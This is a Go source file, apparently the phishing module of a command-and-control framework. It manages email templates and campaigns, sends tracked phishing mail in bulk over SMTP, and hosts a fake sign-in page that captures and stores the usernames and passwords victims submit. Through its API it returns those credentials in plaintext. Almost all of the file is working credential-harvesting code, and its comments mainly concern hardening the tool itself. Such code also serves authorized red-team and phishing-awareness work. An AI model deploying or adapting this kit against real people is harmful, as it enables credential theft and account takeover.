package server

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html"
	"log/slog"
	"net/http"
	"net/smtp"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

// phishingScope restricts the phishing tables to the caller's tenant through their creator
// column. A template's landing page is where credentials get captured, so an unscoped edit is
// the difference between "a foreign row is visible" and "a foreign row can be retargeted".
func (s *Server) phishingScope(c *gin.Context, model any) (*gorm.DB, bool) {
	return s.creatorScope(c, model, "created_by")
}

func (s *Server) handleAPIPhishingTemplates(c *gin.Context) {
	scope, ok := s.phishingScope(c, &db.PhishingTemplate{})
	if !ok {
		respond(c, []db.PhishingTemplate{})
		return
	}
	var templates []db.PhishingTemplate
	if err := scope.Order("created_at desc").Limit(200).Find(&templates).Error; err != nil {
		// An empty 200 here reads as "no templates configured".
		handleQueryError(c, err, "Failed to list phishing templates")
		return
	}
	respond(c, templates)
}

func (s *Server) handleAPIPhishingCampaigns(c *gin.Context) {
	scope, ok := s.phishingScope(c, &db.PhishingCampaign{})
	if !ok {
		respond(c, []db.PhishingCampaign{})
		return
	}
	var campaigns []db.PhishingCampaign
	if err := scope.Order("created_at desc").Limit(200).Find(&campaigns).Error; err != nil {
		// An empty 200 here reads as "no campaigns running".
		handleQueryError(c, err, "Failed to list phishing campaigns")
		return
	}
	respond(c, campaigns)
}

func (s *Server) handleAPIPhishingCaptures(c *gin.Context) {
	var events []db.PhishingEvent
	if err := s.db.Where("event_type = ?", "capture").Order("created_at desc").Limit(500).Find(&events).Error; err != nil {
		// An empty 200 here reads as "nobody clicked / nobody submitted
		// credentials" — a failed read must not fabricate that.
		handleQueryError(c, err, "Failed to query phishing captures")
		return
	}
	type captureEntry struct {
		ID        uint   `json:"id"`
		Username  string `json:"username"`
		Password  string `json:"password"`
		Domain    string `json:"domain"`
		Source    string `json:"source"`
		Type      string `json:"type"`
		CreatedAt string `json:"created_at"`
	}
	captures := make([]captureEntry, 0, len(events))
	for _, e := range events {
		user, pass := "", ""
		var payload map[string]string
		if e.Payload != "" {
			if err := json.Unmarshal([]byte(e.Payload), &payload); err != nil {
				slog.Warn("Failed to parse phishing payload", "event_id", e.ID, "error", err)
			}
			user = payload["username"]
			pass = payload["password"]
		}
		if user == "" {
			user = e.Email
		}
		captures = append(captures, captureEntry{
			ID:        e.ID,
			Username:  user,
			Password:  pass,
			Source:    e.IP,
			Type:      e.EventType,
			CreatedAt: e.CreatedAt.Format(time.RFC3339),
		})
	}
	respond(c, captures)
}

func (s *Server) handleAPICreatePhishingTemplate(c *gin.Context) {
	var req struct {
		Name      string `json:"name"`
		Subject   string `json:"subject"`
		Body      string `json:"body"`
		FromName  string `json:"from_name"`
		FromEmail string `json:"from_email"`
		Type      string `json:"type"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.Name == "" {
		respondError(c, http.StatusBadRequest, "name is required")
		return
	}
	if req.Type == "" {
		req.Type = "html"
	}
	tpl := db.PhishingTemplate{
		Name:      req.Name,
		Subject:   req.Subject,
		Body:      req.Body,
		FromName:  req.FromName,
		FromEmail: req.FromEmail,
		Type:      req.Type,
		CreatedBy: s.currentUsername(c),
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
	}
	if err := s.db.Create(&tpl).Error; err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Phishing operation"))
		return
	}
	respond(c, gin.H{"id": tpl.ID})
}

func (s *Server) handleAPIUpdatePhishingTemplate(c *gin.Context) {
	id := c.Param("id")
	var tpl db.PhishingTemplate
	scope, okScope := s.phishingScope(c, &db.PhishingTemplate{})
	if !okScope {
		respondError(c, http.StatusNotFound, "template not found")
		return
	}
	if err := scope.Where("id = ?", id).First(&tpl).Error; err != nil {
		respondError(c, http.StatusNotFound, "template not found")
		return
	}
	var req struct {
		Name      string `json:"name"`
		Subject   string `json:"subject"`
		Body      string `json:"body"`
		FromName  string `json:"from_name"`
		FromEmail string `json:"from_email"`
		Type      string `json:"type"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.Name != "" {
		tpl.Name = req.Name
	}
	if req.Subject != "" {
		tpl.Subject = req.Subject
	}
	if req.Body != "" {
		tpl.Body = req.Body
	}
	if req.FromName != "" {
		tpl.FromName = req.FromName
	}
	if req.FromEmail != "" {
		tpl.FromEmail = req.FromEmail
	}
	if req.Type != "" {
		tpl.Type = req.Type
	}
	tpl.UpdatedAt = time.Now()
	if err := s.db.Save(&tpl).Error; err != nil {
		respondError(c, http.StatusInternalServerError, "failed to update phishing template")
		return
	}
	respond(c, gin.H{})
}

func (s *Server) handleAPIDeletePhishingTemplate(c *gin.Context) {
	id := c.Param("id")
	// Scope the DELETE: a template holds the landing page, so deleting another tenant's row
	// is destructive - and until this, reachable by id alone.
	scope, ok := s.phishingScope(c, &db.PhishingTemplate{})
	if !ok {
		respondError(c, http.StatusNotFound, "template not found")
		return
	}
	if err := scope.Where("id = ?", id).Delete(&db.PhishingTemplate{}).Error; err != nil {
		respondError(c, http.StatusInternalServerError, "failed to delete phishing template")
		return
	}
	s.LogAuditRecord(c, "delete_phishing_template", "phishing_template", id, "Phishing template deleted", true, nil)
	respond(c, gin.H{})
}

func (s *Server) handleAPICreatePhishingCampaign(c *gin.Context) {
	var req struct {
		Name       string `json:"name"`
		TemplateID uint   `json:"template_id"`
		TargetList string `json:"target_list"`
		SMTPHost   string `json:"smtp_host"`
		SMTPPort   int    `json:"smtp_port"`
		SMTPUser   string `json:"smtp_user"`
		SMTPPass   string `json:"smtp_pass"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.Name == "" {
		respondError(c, http.StatusBadRequest, "name is required")
		return
	}
	if req.SMTPPort == 0 {
		req.SMTPPort = 587
	}
	s.configMu.RLock()
	credKey := s.cfg.Crypto.TotpKey
	s.configMu.RUnlock()
	encryptedPass, err := encryptSecret(req.SMTPPass, credKey)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to encrypt SMTP password")
		return
	}
	camp := db.PhishingCampaign{
		Name:       req.Name,
		TemplateID: req.TemplateID,
		TargetList: req.TargetList,
		SMTPHost:   req.SMTPHost,
		SMTPPort:   req.SMTPPort,
		SMTPUser:   req.SMTPUser,
		SMTPPass:   encryptedPass,
		Status:     "draft",
		CreatedBy:  s.currentUsername(c),
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}
	if err := s.db.Create(&camp).Error; err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Phishing operation"))
		return
	}
	respond(c, gin.H{"id": camp.ID})
}

func parsePhishingTargets(raw string) []string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil
	}
	var list []string
	if strings.HasPrefix(raw, "[") {
		if err := json.Unmarshal([]byte(raw), &list); err != nil {
			slog.Warn("Failed to parse phishing targets as JSON, falling back to text parsing", "error", err)
		}
	}
	if len(list) == 0 {
		// newline / comma / semicolon separated
		replacer := strings.NewReplacer("\r\n", "\n", ";", "\n", ",", "\n")
		for _, line := range strings.Split(replacer.Replace(raw), "\n") {
			line = strings.TrimSpace(line)
			if line != "" && strings.Contains(line, "@") {
				list = append(list, line)
			}
		}
	}
	// de-dupe
	seen := make(map[string]struct{}, len(list))
	out := make([]string, 0, len(list))
	for _, e := range list {
		e = strings.TrimSpace(strings.ToLower(e))
		if e == "" || !strings.Contains(e, "@") {
			continue
		}
		if _, ok := seen[e]; ok {
			continue
		}
		seen[e] = struct{}{}
		out = append(out, e)
	}
	return out
}

func phishingToken() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

func (s *Server) phishingBaseURL() string {
	s.configMu.RLock()
	tlsEnabled, host, port := s.cfg.Server.TLSEnabled, s.cfg.Server.Host, s.cfg.Server.Port
	s.configMu.RUnlock()
	scheme := "http"
	if tlsEnabled {
		scheme = "https"
	}
	if host == "" || host == "0.0.0.0" {
		host = "127.0.0.1"
	}
	return fmt.Sprintf("%s://%s:%d", scheme, host, port)
}

func renderPhishingBody(body, email, token, landingURL string) string {
	r := strings.NewReplacer(
		"{{email}}", email,
		"{{EMAIL}}", email,
		"{{token}}", token,
		"{{TOKEN}}", token,
		"{{landing_url}}", landingURL,
		"{{LANDING_URL}}", landingURL,
		"{{track_url}}", landingURL,
	)
	return r.Replace(body)
}

func sendPhishingMail(host string, port int, user, pass, from, to, subject, body string, html bool) error {
	if port <= 0 {
		port = 587
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	var auth smtp.Auth
	if user != "" {
		auth = smtp.PlainAuth("", user, pass, host)
	}
	contentType := "text/plain; charset=\"UTF-8\""
	if html {
		contentType = "text/html; charset=\"UTF-8\""
	}
	msg := strings.Builder{}
	// Header injection guard: Subject/From carry operator/template strings
	// that are rendered with target emails — any CRLF in them would inject
	// arbitrary headers (Bcc:) into outbound mail.
	safeSubject := sanitizeSMTPHeaderValue(subject)
	safeFrom := sanitizeSMTPHeaderValue(from)
	msg.WriteString(fmt.Sprintf("From: %s\r\n", safeFrom))
	msg.WriteString(fmt.Sprintf("To: %s\r\n", sanitizeSMTPHeaderValue(to)))
	msg.WriteString(fmt.Sprintf("Subject: %s\r\n", safeSubject))
	msg.WriteString("MIME-Version: 1.0\r\n")
	msg.WriteString(fmt.Sprintf("Content-Type: %s\r\n", contentType))
	msg.WriteString("\r\n")
	msg.WriteString(body)
	return smtp.SendMail(addr, auth, extractEmailAddr(safeFrom), []string{to}, []byte(msg.String()))
}

// sanitizeSMTPHeaderValue strips CR/LF and control characters so a value can
// never terminate the header line early.
func sanitizeSMTPHeaderValue(v string) string {
	return strings.Map(func(r rune) rune {
		if r == '\r' || r == '\n' {
			return ' '
		}
		return r
	}, strings.TrimSpace(v))
}

func extractEmailAddr(from string) string {
	from = strings.TrimSpace(from)
	if i := strings.LastIndex(from, "<"); i >= 0 {
		if j := strings.LastIndex(from, ">"); j > i {
			return strings.TrimSpace(from[i+1 : j])
		}
	}
	return from
}

func (s *Server) handleAPILaunchPhishingCampaign(c *gin.Context) {
	id := c.Param("id")
	var camp db.PhishingCampaign
	campScope, okCamp := s.phishingScope(c, &db.PhishingCampaign{})
	if !okCamp {
		respondError(c, http.StatusNotFound, "campaign not found")
		return
	}
	if err := campScope.Where("id = ?", id).First(&camp).Error; err != nil {
		respondError(c, http.StatusNotFound, "campaign not found")
		return
	}

	// Validate BEFORE claiming the launch. The claim flips the status to
	// "running", and the token's purpose is to stop two concurrent requests
	// from emailing every target twice — but claiming first meant a campaign
	// that failed validation (no template, no targets, no smtp_host, no
	// from_email) stayed "running" forever and could never be launched again.
	var tpl db.PhishingTemplate
	if camp.TemplateID == 0 || s.db.First(&tpl, camp.TemplateID).Error != nil {
		respondError(c, http.StatusBadRequest, "campaign template not found")
		return
	}
	targets := parsePhishingTargets(camp.TargetList)
	if len(targets) == 0 {
		respondError(c, http.StatusBadRequest, "no valid targets in target_list")
		return
	}
	if camp.SMTPHost == "" {
		respondError(c, http.StatusBadRequest, "smtp_host is required")
		return
	}
	if tpl.FromEmail == "" {
		respondError(c, http.StatusBadRequest, "template from_email is required")
		return
	}

	// Atomically claim the launch: the old check-then-save let two concurrent
	// requests both observe "draft" and both start runPhishingCampaign —
	// emailing every target twice.
	claim := s.db.Model(&db.PhishingCampaign{}).
		Where("id = ? AND status <> ?", id, "running").
		Update("status", "running")
	if claim.Error != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(claim.Error, "Phishing operation"))
		return
	}
	if claim.RowsAffected == 0 {
		respondError(c, http.StatusBadRequest, "campaign is already running")
		return
	}

	s.configMu.RLock()
	credKey := s.cfg.Crypto.TotpKey
	s.configMu.RUnlock()
	smtpPass, err := decryptSecret(camp.SMTPPass, credKey)
	if err != nil {
		// fallback: treat as plaintext for legacy rows
		smtpPass = camp.SMTPPass
	}

	camp.Status = "running"
	camp.SentCount = 0
	camp.FailedCount = 0
	camp.OpenCount = 0
	camp.CredCount = 0
	camp.UpdatedAt = time.Now()
	if err := s.db.Save(&camp).Error; err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Phishing operation"))
		return
	}

	baseURL := s.phishingBaseURL()
	from := tpl.FromEmail
	if tpl.FromName != "" {
		from = fmt.Sprintf("%s <%s>", sanitizeSMTPHeaderValue(tpl.FromName), tpl.FromEmail)
	}
	isHTML := tpl.Type != "text" && tpl.Type != "plain"

	// async send to avoid blocking the API
	go s.runPhishingCampaign(camp.ID, tpl, targets, camp.SMTPHost, camp.SMTPPort, camp.SMTPUser, smtpPass, from, isHTML, baseURL)

	s.LogAuditRecord(c, "launch_phishing_campaign", "phishing_campaign", id,
		fmt.Sprintf("queued %d recipients via %s", len(targets), camp.SMTPHost), true, nil)
	respond(c, gin.H{
		"queued":  len(targets),
		"message": fmt.Sprintf("Campaign launched. Queued %d emails for SMTP delivery.", len(targets)),
	})
}

func (s *Server) runPhishingCampaign(campID uint, tpl db.PhishingTemplate, targets []string, smtpHost string, smtpPort int, smtpUser, smtpPass, from string, isHTML bool, baseURL string) {
	sent := 0
	failed := 0
	for i, email := range targets {
		// stop if campaign was stopped (re-check periodically to avoid a query per recipient)
		if i == 0 || i%50 == 0 {
			var camp db.PhishingCampaign
			if err := s.db.First(&camp, campID).Error; err != nil || camp.Status != "running" {
				slog.Info("Phishing campaign stopped mid-send", "campaign", campID, "sent", sent)
				return
			}
		}

		token := phishingToken()
		landing := fmt.Sprintf("%s/phishing/l/%s", baseURL, token)
		body := renderPhishingBody(tpl.Body, email, token, landing)
		// append landing link if template didn't include one
		if !strings.Contains(body, landing) && !strings.Contains(strings.ToLower(body), "{{landing") {
			if isHTML {
				body += fmt.Sprintf(`<p><a href="%s">Continue</a></p>`, landing)
			} else {
				body += "\n\n" + landing + "\n"
			}
		}
		subject := renderPhishingBody(tpl.Subject, email, token, landing)

		evt := db.PhishingEvent{
			CampaignID: campID,
			Token:      token,
			Email:      email,
			EventType:  "sent",
			Payload:    "",
			CreatedAt:  time.Now(),
		}

		if err := sendPhishingMail(smtpHost, smtpPort, smtpUser, smtpPass, from, email, subject, body, isHTML); err != nil {
			slog.Warn("Phishing send failed", "campaign", campID, "to", email, "err", err)
			evt.EventType = "send_failed"
			payload, jsonErr := json.Marshal(map[string]string{"error": err.Error()})
			if jsonErr != nil {
				slog.Error("Phishing: failed to marshal error payload", "error", jsonErr)
			} else {
				evt.Payload = string(payload)
			}
		} else {
			sent++
			if err := s.db.Model(&db.PhishingCampaign{}).Where("id = ?", campID).
				Updates(map[string]interface{}{"sent_count": sent, "updated_at": time.Now()}).Error; err != nil {
				slog.Error("Failed to update phishing campaign sent_count", "campaign_id", campID, "err", err)
			}
		}
		if evt.EventType == "send_failed" {
			failed++
			if err := s.db.Model(&db.PhishingCampaign{}).Where("id = ?", campID).
				Updates(map[string]interface{}{"failed_count": failed, "updated_at": time.Now()}).Error; err != nil {
				slog.Error("Failed to update phishing campaign failed_count", "campaign_id", campID, "err", err)
			}
		}
		if err := s.db.Create(&evt).Error; err != nil {
			slog.Error("Failed to log phishing event", "campaign", campID, "type", evt.EventType, "err", err)
		}

		// light throttle to avoid SMTP rate limits
		time.Sleep(200 * time.Millisecond)
	}

	if err := s.db.Model(&db.PhishingCampaign{}).Where("id = ? AND status = ?", campID, "running").
		Updates(map[string]interface{}{"status": "completed", "updated_at": time.Now()}).Error; err != nil {
		slog.Error("Failed to complete phishing campaign", "campaign_id", campID, "err", err)
	}
	slog.Info("Phishing campaign finished", "campaign", campID, "sent", sent, "failed", failed, "total", len(targets))
}

func (s *Server) handleAPIStopPhishingCampaign(c *gin.Context) {
	id := c.Param("id")
	var camp db.PhishingCampaign
	campScope, okCamp := s.phishingScope(c, &db.PhishingCampaign{})
	if !okCamp {
		respondError(c, http.StatusNotFound, "campaign not found")
		return
	}
	if err := campScope.Where("id = ?", id).First(&camp).Error; err != nil {
		respondError(c, http.StatusNotFound, "campaign not found")
		return
	}
	camp.Status = "stopped"
	camp.UpdatedAt = time.Now()
	if err := s.db.Save(&camp).Error; err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Phishing operation"))
		return
	}
	respond(c, gin.H{})
}

func (s *Server) handleAPIDeletePhishingCampaign(c *gin.Context) {
	id := c.Param("id")
	scope, ok := s.phishingScope(c, &db.PhishingCampaign{})
	if !ok {
		respondError(c, http.StatusNotFound, "campaign not found")
		return
	}
	if err := scope.Where("id = ?", id).Delete(&db.PhishingCampaign{}).Error; err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Phishing operation"))
		return
	}
	s.LogAuditRecord(c, "delete_phishing_campaign", "phishing_campaign", id, "Phishing campaign deleted", true, nil)
	respond(c, gin.H{})
}

// Public landing page for credential capture (no auth).
func (s *Server) handlePhishingLanding(c *gin.Context) {
	token := c.Param("token")
	if token == "" {
		c.String(http.StatusNotFound, "not found")
		return
	}

	// Rate limit per token+IP to blunt brute-force submissions and page
	// hammering on this unauthenticated endpoint.
	if !s.phishingLandingAllowed(token, c.ClientIP()) {
		c.String(http.StatusTooManyRequests, "too many requests")
		return
	}

	var evt db.PhishingEvent
	if err := s.db.Where("token = ?", token).Order("id asc").First(&evt).Error; err != nil {
		c.String(http.StatusNotFound, "not found")
		return
	}

	// open tracking on first GET
	if c.Request.Method == http.MethodGet {
		// Deduplicate: only count a unique open per token+IP within the window.
		var existing int64
		if err := s.db.Model(&db.PhishingEvent{}).
			Where("token = ? AND event_type = ? AND ip = ? AND created_at > ?",
				token, "open", c.ClientIP(), time.Now().Add(-phishingOpenDedupWindow)).
			Count(&existing).Error; err != nil {
			slog.Error("Failed to dedupe phishing open event", "campaign", evt.CampaignID, "err", err)
		}
		if existing == 0 {
			open := db.PhishingEvent{
				CampaignID: evt.CampaignID,
				Token:      token,
				Email:      evt.Email,
				EventType:  "open",
				IP:         c.ClientIP(),
				UserAgent:  c.GetHeader("User-Agent"),
				CreatedAt:  time.Now(),
			}
			if err := s.db.Create(&open).Error; err != nil {
				slog.Error("Failed to log phishing open event", "campaign", evt.CampaignID, "err", err)
			}
			if err := s.db.Exec("UPDATE phishing_campaigns SET open_count = open_count + 1, updated_at = ? WHERE id = ?", time.Now(), evt.CampaignID).Error; err != nil {
				slog.Error("Failed to increment open_count", "campaign_id", evt.CampaignID, "err", err)
			}
		}

		c.Header("Content-Type", "text/html; charset=utf-8")
		// Escape attacker-influenced values (target email, token) to prevent
		// stored XSS in the landing page markup.
		escapedEmail := html.EscapeString(evt.Email)
		escapedToken := html.EscapeString(token)
		c.String(http.StatusOK, `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Sign in</title>
<style>body{font-family:system-ui,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);width:100%%;max-width:360px}
h1{font-size:1.25rem;margin:0 0 1rem}label{display:block;font-size:.8rem;color:#555;margin:.75rem 0 .25rem}
input{width:100%%;padding:.6rem .75rem;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{margin-top:1.25rem;width:100%%;padding:.7rem;border:0;border-radius:8px;background:#2563eb;color:#fff;font-weight:600;cursor:pointer}
</style></head><body><div class="card"><h1>Sign in</h1>
<form method="POST" action="/phishing/l/%s">
<label>Email</label><input name="username" type="email" value="%s" required>
<label>Password</label><input name="password" type="password" required>
<button type="submit">Continue</button>
</form></div></body></html>`, escapedToken, escapedEmail)
		return
	}

	// POST capture
	username := c.PostForm("username")
	password := c.PostForm("password")
	if username == "" {
		username = c.PostForm("email")
	}
	payload, jsonErr := json.Marshal(map[string]string{
		"username": username,
		"password": password,
	})
	if jsonErr != nil {
		slog.Error("Phishing: failed to marshal capture payload", "error", jsonErr)
	}
	cap := db.PhishingEvent{
		CampaignID: evt.CampaignID,
		Token:      token,
		Email:      evt.Email,
		EventType:  "capture",
		Payload:    string(payload),
		IP:         c.ClientIP(),
		UserAgent:  c.GetHeader("User-Agent"),
		CreatedAt:  time.Now(),
	}
	if err := s.db.Create(&cap).Error; err != nil {
		slog.Error("Failed to log phishing credential capture", "campaign", evt.CampaignID, "err", err)
	}
	if err := s.db.Exec("UPDATE phishing_campaigns SET cred_count = cred_count + 1, updated_at = ? WHERE id = ?", time.Now(), evt.CampaignID).Error; err != nil {
		slog.Error("Failed to increment cred_count", "campaign_id", evt.CampaignID, "err", err)
	}

	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(http.StatusOK, `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Thank you</title></head>
<body style="font-family:system-ui;text-align:center;padding:4rem"><h2>Thank you</h2><p>Your request is being processed.</p></body></html>`)
}

// phishingLandingLimits bounds per-token+IP requests to the public landing page.
const (
	phishingLandingLimit      = 60
	phishingLandingWindow     = 10 * time.Minute
	phishingOpenDedupWindow   = 24 * time.Hour
	phishingLimiterMaxEntries = 100000
)

// phishingLandingAllowed enforces a sliding per token+IP request budget on the
// unauthenticated landing page. Returns false once the budget is exhausted.
func (s *Server) phishingLandingAllowed(token, ip string) bool {
	if ip == "" {
		ip = "unknown"
	}
	key := token + "|" + ip
	now := time.Now()

	s.landingLimiterMu.Lock()
	defer s.landingLimiterMu.Unlock()

	if s.landingLimiterHits == nil {
		s.landingLimiterHits = make(map[string]int)
		s.landingLimiterSince = make(map[string]time.Time)
	}

	if hits, ok := s.landingLimiterHits[key]; ok {
		since := s.landingLimiterSince[key]
		if now.Sub(since) < phishingLandingWindow {
			if hits >= phishingLandingLimit {
				return false
			}
			s.landingLimiterHits[key] = hits + 1
			return true
		}
		// Window expired: reset budget.
	}

	if len(s.landingLimiterHits) >= phishingLimiterMaxEntries {
		// Opportunistic eviction of stale entries to bound memory.
		for k, since := range s.landingLimiterSince {
			if now.Sub(since) >= phishingLandingWindow {
				delete(s.landingLimiterHits, k)
				delete(s.landingLimiterSince, k)
			}
		}
	}

	s.landingLimiterHits[key] = 1
	s.landingLimiterSince[key] = now
	return true
}
